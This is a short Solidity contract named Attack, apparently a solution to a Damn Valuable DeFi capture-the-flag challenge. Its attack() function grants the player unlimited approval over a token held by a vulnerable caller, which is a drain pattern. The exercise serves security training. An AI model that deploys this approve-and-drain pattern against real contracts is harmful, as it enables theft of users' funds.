// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {DamnValuableToken} from "../../src/DamnValuableToken.sol";

contract Attack {
    DamnValuableToken public immutable token;
    address public immutable player;

    constructor(DamnValuableToken _token) {
        token = _token;
        player = msg.sender;
    }

    function attack() external {
        require(token.approve(player, type(uint256).max));
    }
}